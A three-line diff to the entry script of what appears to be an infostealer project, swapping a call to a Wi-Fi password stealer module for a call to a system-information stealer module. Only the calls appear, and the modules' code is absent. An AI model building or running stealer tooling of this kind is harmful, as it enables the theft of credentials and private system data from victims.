@@ -1,3 +1,3 @@
-from modules.network import wifi_passwords
+from modules.systeminfo import system
 
-wifi_passwords.WifiPasswordStealer().run()
+system.SystemInfoStealer().run()
